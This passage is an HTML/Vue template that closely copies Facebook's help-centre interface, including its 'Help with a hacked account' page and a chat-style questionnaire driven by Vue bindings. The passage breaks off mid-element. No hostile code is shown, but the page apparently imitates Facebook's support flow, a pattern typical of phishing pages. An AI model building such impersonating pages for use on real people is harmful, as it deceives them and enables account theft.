                                                                    <i data-visualcompletion="css-img" class="x1b0d499 x1d69dk1" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/AeSrEkNAMd2.png&quot;); background-position: 0px -1476px; background-size: auto; width: 24px; height: 24px; background-repeat: no-repeat; display: inline-block;"></i>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m" role="none" data-visualcompletion="ignore" style="inset: 0px;"></div>
                                                        </div>
                                                      </div>
                                                    </span>
                                                  </span>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div role="listitem" class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xykv574 xbmpl8g x1wsgfga x9otpla">
                                      <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np">
                                        <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9">
                                          <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2">
                                            <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l xwib8y2 x1y1aw1k">
                                              <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                <div class="xu06os2 x1ok221b">
                                                  <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h" dir="auto">
                                                    <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">
                                                      <div data-visualcompletion="ignore-dynamic" role="listitem" style="padding-left:8px;padding-right:8px">
                                                        <div class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq" role="button" tabindex="-1">
                                                          <div class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh">
                                                            <div class="x78zum5 xdt5ytf xq8finb x1xmf6yo x1e56ztr x1n2onr6 xqcrz7y">
                                                              <div class="x14yjl9h xudhj91 x18nykt9 xww2gxu x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x3nfvp2 xl56j7k x1n2onr6 x1qhmfi1 xc9qbxq x14qfxbe">
                                                                <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/AeSrEkNAMd2.png');background-position:0 -6038px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                                              </div>
                                                            </div>
                                                            <div class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z">
                                                              <div class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z">
                                                                <div class="">
                                                                  <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                                    <div class="xu06os2 x1ok221b">
                                                                      <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h" id=":R5lla96l9aqqaupapd5aq:">
                                                                        <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">Managing Your Account</span>
                                                                      </span>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                              <div class="xod5an3 x16n37ib x14vqqas x1n2onr6 xqcrz7y">
                                                                <div class="x6s0dn4 x78zum5 x1q0g3np">
                                                                  <div class="x78zum5">
                                                                    <i data-visualcompletion="css-img" class="x1b0d499 x1d69dk1" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/AeSrEkNAMd2.png');background-position:0 -1476px;background-size:auto;width:24px;height:24px;background-repeat:no-repeat;display:inline-block"></i>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m" role="none" data-visualcompletion="ignore"></div>
                                                        </div>
                                                      </div>
                                                    </span>
                                                  </span>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div role="listitem" class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xykv574 xbmpl8g x1wsgfga x9otpla">
                                      <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np">
                                        <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9">
                                          <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2">
                                            <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l xwib8y2 x1y1aw1k">
                                              <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                <div class="xu06os2 x1ok221b">
                                                  <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h" dir="auto">
                                                    <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">
                                                      <div data-visualcompletion="ignore-dynamic" role="listitem" style="padding-left:8px;padding-right:8px">
                                                        <div class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq" role="button" tabindex="-1">
                                                          <div class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh">
                                                            <div class="x78zum5 xdt5ytf xq8finb x1xmf6yo x1e56ztr x1n2onr6 xqcrz7y">
                                                              <div class="x14yjl9h xudhj91 x18nykt9 xww2gxu x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x3nfvp2 xl56j7k x1n2onr6 x1qhmfi1 xc9qbxq x14qfxbe">
                                                                <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/fvii2YAqNPt.png');background-position:0 -607px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                                              </div>
                                                            </div>
                                                            <div class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z">
                                                              <div class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z">
                                                                <div class="">
                                                                  <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                                    <div class="xu06os2 x1ok221b">
                                                                      <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h" id=":R5lle96l9aqqaupapd5aq:">
                                                                        <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">Privacy, Safety and Security</span>
                                                                      </span>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                              <div class="xod5an3 x16n37ib x14vqqas x1n2onr6 xqcrz7y">
                                                                <div class="x6s0dn4 x78zum5 x1q0g3np">
                                                                  <div class="x78zum5">
                                                                    <i data-visualcompletion="css-img" class="x1b0d499 x1d69dk1" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/AeSrEkNAMd2.png');background-position:0 -1476px;background-size:auto;width:24px;height:24px;background-repeat:no-repeat;display:inline-block"></i>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m" role="none" data-visualcompletion="ignore"></div>
                                                        </div>
                                                      </div>
                                                    </span>
                                                  </span>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                    <div role="listitem" class="x9f619 x1n2onr6 x1ja2u2z x1qjc9v5 x78zum5 xdt5ytf x1iyjqo2 xl56j7k xeuugli xykv574 xbmpl8g x1wsgfga x9otpla">
                                      <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x6s0dn4 xozqiw3 x1q0g3np">
                                        <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x1iyjqo2 xs83m0k xeuugli x1qughib x6s0dn4 x1a02dak x1q0g3np xdl72j9">
                                          <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x1iyjqo2">
                                            <div class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l xwib8y2 x1y1aw1k">
                                              <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                <div class="xu06os2 x1ok221b">
                                                  <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x3x7a5m x6prxxf xvq8zen xo1l8bm xi81zsa x1yc453h" dir="auto">
                                                    <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">
                                                      <div data-visualcompletion="ignore-dynamic" role="listitem" style="padding-left:8px;padding-right:8px">
                                                        <div class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x2lwn1j xeuugli xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x1q0g3np x87ps6o x1lku1pv x1a2a7pz x1lq5wgf xgqcy7u x30kzoy x9jhf4c x1lliihq" role="button" tabindex="-1">
                                                          <div class="x6s0dn4 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r xeuugli x18d9i69 x1sxyh0 xurb0ha xexx8yu x1n2onr6 x1ja2u2z x1gg8mnh">
                                                            <div class="x78zum5 xdt5ytf xq8finb x1xmf6yo x1e56ztr x1n2onr6 xqcrz7y">
                                                              <div class="x14yjl9h xudhj91 x18nykt9 xww2gxu x6s0dn4 x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x3nfvp2 xl56j7k x1n2onr6 x1qhmfi1 xc9qbxq x14qfxbe">
                                                                <i data-visualcompletion="css-img" class="x1b0d499 xep6ejk" aria-hidden="true" style="background-image:url('https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/V-VQIs5U3iJ.png');background-position:0 -566px;background-size:auto;width:20px;height:20px;background-repeat:no-repeat;display:inline-block"></i>
                                                              </div>
                                                            </div>
                                                            <div class="x6s0dn4 xkh2ocl x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1q0g3np x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x18d9i69 x4uap5 xkhd6sd xexx8yu x1n2onr6 x1ja2u2z">
                                                              <div class="x1qjc9v5 x1q0q8m5 x1qhh985 xu3j5b3 xcfux6l x26u7qi xm0m39n x13fuv20 x972fbf x9f619 x78zum5 x1r8uery xdt5ytf x1iyjqo2 xs83m0k x1qughib xat24cr x11i5rnm x1mh8g0r xdj266r x2lwn1j xeuugli x4uap5 xkhd6sd xz9dl7a xsag5q8 x1n2onr6 x1ja2u2z">
                                                                <div class="">
                                                                  <div class="x78zum5 xdt5ytf xz62fqu x16ldp7u">
                                                                    <div class="xu06os2 x1ok221b">
                                                                      <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 xk50ysn xzsf02u x1yc453h" id=":R5lli96l9aqqaupapd5aq:">
                                                                        <span class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lkfr7t x1lbecb7 x1s688f xzsf02u">Policies and Reporting</span>
                                                                      </span>
                                                                    </div>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                              <div class="xod5an3 x16n37ib x14vqqas x1n2onr6 xqcrz7y">
                                                                <div class="x6s0dn4 x78zum5 x1q0g3np">
                                                                  <div class="x78zum5">
                                                                    <i data-visualcompletion="css-img" class="x1b0d499 x1d69dk1" aria-hidden="true" style="background-image: url(&quot;https://static.xx.fbcdn.net/rsrc.php/v3/ym/r/AeSrEkNAMd2.png&quot;); background-position: 0px -1476px; background-size: auto; width: 24px; height: 24px; background-repeat: no-repeat; display: inline-block;"></i>
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div>
                                                          <div class="x1ey2m1c xds687c x17qophe xg01cxk x47corl x10l6tqk x13vifvy x1ebt8du x19991ni x1dhq9h x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m" role="none" data-visualcompletion="ignore"></div>
                                                        </div>
                                                      </div>
                                                    </span>
                                                  </span>
                                                </div>
                                              </div>
                                            </div>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                                <div class="x14nfmen x1s85apg x5yr21d xds687c xg01cxk x10l6tqk x13vifvy x1wsgiic x19991ni xwji4o3 x1kky2od x1sd63oq" data-visualcompletion="ignore" data-thumb="1" style="display: none; height: 683px; right: 0px;"></div>
                                <div class="x9f619 x1s85apg xds687c xg01cxk xexx8yu x150jy0e x18d9i69 x1e558r4 x47corl x10l6tqk x13vifvy x1n4smgl x1d8287x x19991ni xwji4o3 x1kky2od" data-visualcompletion="ignore" data-thumb="1" style="display: block; height: 0px; right: 0px; transform: matrix3d(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, -1) scale(1.82723) translateZ(-0.827233px) translateZ(-2px);">
                                  <div class="x1hwfnsy x1lcm9me x1yr5g0i xrt01vj x10y3i5r x5yr21d xh8yej3"></div>
                                </div>
                              </div>
                            </nav>

                              <div
                                class="x14nfmen x1s85apg x5yr21d xds687c xg01cxk x10l6tqk x13vifvy x1wsgiic x19991ni xwji4o3 x1kky2od x1sd63oq"
                                data-visualcompletion="ignore"
                                data-thumb="1"
                                style="display: none; height: 886px; right: 0px"
                              ></div>
                              <div
                                class="x9f619 x1s85apg xds687c xg01cxk xexx8yu x150jy0e x18d9i69 x1e558r4 x47corl x10l6tqk x13vifvy x1n4smgl x1d8287x x19991ni xwji4o3 x1kky2od"
                                data-visualcompletion="ignore"
                                data-thumb="1"
                                style="display: block; height: 0px; right: 0px"
                              >
                                <div
                                  class="x1hwfnsy x1lcm9me x1yr5g0i xrt01vj x10y3i5r x5yr21d xh8yej3"
                                ></div>
                              </div>
                            </div>
                          </nav>
                        </div>
                        <div
                          class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x193iq5w xeuugli x1r8uery x1iyjqo2 xs83m0k x1yrsyyn x18d9i69"
                        >
                          <div
                            class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                          >
                            <div
                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                            >
                              <div
                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1e558r4 x150jy0e"
                              >
                                <div class="x1c7ia4l xn2ks54 xh8yej3 x7fw0su">
                                  <div>
                                    <div>
                                      <div
                                        class="x1qjc9v5 x78zum5 xl56j7k x193iq5w x1t2pt76"
                                      >
                                        <div
                                          class="x6s0dn4 x78zum5 xdt5ytf x193iq5w x1t2pt76 xh8yej3"
                                          role="main"
                                        >
                                          <div
                                            class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x1yjoq1l x1sgudl8 x1swvt13 x1pi30zi x1p5oq8j"
                                          >
                                            <div
                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                            >
                                              <div
                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                              >
                                                <div
                                                  class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w xyamay9 x1l90r2v xua58t2"
                                                >
                                                  <div
                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                  >
                                                    <div
                                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1xmf6yo x1e56ztr xzboxd6 x14l7nz5"
                                                    >
                                                      <div
                                                        class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w xjkvuk6 x1cnzs8"
                                                      >
                                                        <div
                                                          class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                        >
                                                          <div
                                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                          >
                                                            <div
                                                              class="x78zum5 xdt5ytf x11tup63 x16z1lm9"
                                                            >
                                                              <div
                                                                class="xwoyzhm x1rhet7l"
                                                              >
                                                                <h2
                                                                  class="x1heor9g x1qlqyl8 x1pd3egz x1a2a7pz x193iq5w xeuugli"
                                                                  dir="auto"
                                                                >
                                                                  <span
                                                                    class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x14z4hjw xw06pyt xngnso2 x1qb5hxa x1xlr1w8 xzsf02u x1yc453h"
                                                                    dir="auto"
                                                                    ><span
                                                                      class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 x1120s5i"
                                                                      style="
                                                                        -webkit-box-orient: vertical;
                                                                        -webkit-line-clamp: 2;
                                                                        display: -webkit-box;
                                                                      "
                                                                      >Help with
                                                                      a hacked
                                                                      account</span
                                                                    ></span
                                                                  >
                                                                </h2>
                                                              </div>
                                                              <div
                                                                class="xwoyzhm x1rhet7l"
                                                              >
                                                                <span
                                                                  class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xtoi2st x41vudc x1603h9y x1u7k74 xo1l8bm xzsf02u x1yc453h"
                                                                  dir="auto"
                                                                  ><span
                                                                    class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 x1j85h84"
                                                                    style="
                                                                      -webkit-box-orient: vertical;
                                                                      -webkit-line-clamp: 3;
                                                                      display: -webkit-box;
                                                                    "
                                                                    >Answer a
                                                                    few
                                                                    questions,
                                                                    and we'll
                                                                    help you
                                                                    find the
                                                                    right
                                                                    solution.</span
                                                                  ></span
                                                                >
                                                              </div>
                                                            </div>
                                                          </div>
                                                        </div>
                                                      </div>
                                                    </div>
                                                  </div>
                                                </div>
                                              </div>

                                              
                                              <div
                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w"
                                              >
                                                <div
                                                  class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w xyamay9 x1l90r2v"
                                                >
                                                  <div
                                                    class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                  >
                                                    <div
                                                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1gslohp x12nagc xzboxd6 x14l7nz5"
                                                    >
                                                      <div
                                                        class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                      >
                                                        <div
                                                          class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                        >
                                                          <div
                                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1gslohp x12nagc xzboxd6 x14l7nz5"
                                                          >
                                                          </div>
                                                          <!-- here -->
                                                          <template v-for="entry in conversation" :key="entry.text">
                                                            <div
                                                              v-if="entry.type === 'question'"
                                                              class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1nhvcw1 x6s0dn4 xozqiw3 x1q0g3np xexx8yu xykv574 xbmpl8g x4cne27 xifccgj"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
                                                              >
                                                                <svg
                                                                  viewBox="0 0 36 36"
                                                                  class="x1lliihq x1k90msu x2h7rmj x1qfuztq x5e5rjt"
                                                                  fill="currentColor"
                                                                  height="32"
                                                                  width="32"
                                                                >
                                                                  <path
                                                                    d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34h5.5l.681 1.87Z"
                                                                  ></path>
                                                                  <path
                                                                    class="xe3v8dz"
                                                                    d="M13.651 35.471v-11.97H9.936V18h3.715v-2.37c0-6.127 2.772-8.964 8.784-8.964 1.138 0 3.103.223 3.91.446v4.983c-.425-.043-1.167-.065-2.081-.065-2.952 0-4.09 1.116-4.09 4.025V18h5.883l-1.008 5.5h-4.867v12.37a18.183 18.183 0 0 1-6.53-.399Z"
                                                                  ></path>
                                                                </svg>
                                                              </div> 
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf xsyo7zv x16hj40l x10b6aqq x1yrsyyn xs83m0k x193iq5w xeuugli"
                                                              >
                                                                <div
                                                                  class="x443n21 xyi19xy x1ccrb07 xtf3nb5 x1pc53ja xz9dl7a xn6708d xsag5q8 x1ye3gou"
                                                                >
                                                                    <div class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xo1l8bm xzsf02u">{{ entry.text }}</div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                            <!-- answer -->
                                                          <div
                                                            v-if="entry.type === 'answer'"
                                                            class="answerOne x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1gslohp x12nagc xzboxd6 x14l7nz5"
                                                          >
                                                            <div
                                                              class="x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xuk3077 x1gslohp x12nagc xzboxd6 x14l7nz5"
                                                                >
                                                                  <div
                                                                    class="x16u764g x1s41l9u x1r4l5d8 x1yzsq9j xyi19xy x1ccrb07 xtf3nb5 x1pc53ja xh9uqaf xz9dl7a xn6708d xsag5q8 x1ye3gou"
                                                                  >
                                                                    <span
                                                                    style="white-space: pre-wrap;"
                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 xo1l8bm xzsf02u"
                                                                      dir="auto"
                                                                      >{{ entry.text }}</span
                                                                    >
                                                                  </div>
                                                                </div>
                                                              </div>
                                                            </div>
                                                          </div> 

                                                          </template>

                                                          <div
                                                            v-if="currentOptions.length > 0"
                                                            v-for="option in currentOptions" :key="option.value" @click="selectOption(option)"
                                                            class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w x1gslohp x12nagc xzboxd6 x14l7nz5"
                                                          >
                                                            <div
                                                              style=""
                                                              class="questions x1n2onr6 x1ja2u2z x9f619 x78zum5 xdt5ytf x2lah0s x193iq5w"
                                                            >
                                                              <div
                                                                class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x1iyjqo2 x2lwn1j"
                                                              >
                                                                <div
                                                                  class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xr9ek0c xjpr12u xzboxd6 x14l7nz5"
                                                                >
                                                                  <div
                                                                  style="border-radius: 20px;
                                                                  border: 1px solid var(--wash);
                                                                  font-weight: 400;
                                                                  margin: 4px 0;
                                                                  max-width: 70%;
                                                                  padding: 6px 14px;"
                                                                    class="x1i10hfl x1qjc9v5 xjbqb8w xjqpnuy xa49m3k xqeqjp1 x2hbi6w x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x1ypdohk xdl72j9 x2lah0s xe8uvvx xdj266r x11i5rnm xat24cr x2lwn1j xeuugli x1n2onr6 x16tdsg8 x1hl2dhg xggy1nq x1ja2u2z x1t137rt x3nfvp2 x1q0g3np x87ps6o x1lku1pv x1a2a7pz xyi19xy x1ccrb07 xtf3nb5 x1pc53ja x7i73kt xh9uqaf xz9dl7a xn6708d xsag5q8 x1ye3gou"
                                                                    role="button"
                                                                    tabindex="0"
                                                                  >
                                                                    <span
                                                                      class="x193iq5w xeuugli x13faqbe x1vvkbs x1xmvt09 x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x676frb x1lkfr7t x1lbecb7 x1s688f xzsf02u"
                                                                      dir="auto"
                                                                    >
                                                                      {{ option.label }}
                                                                    </span>
                                                                    <div
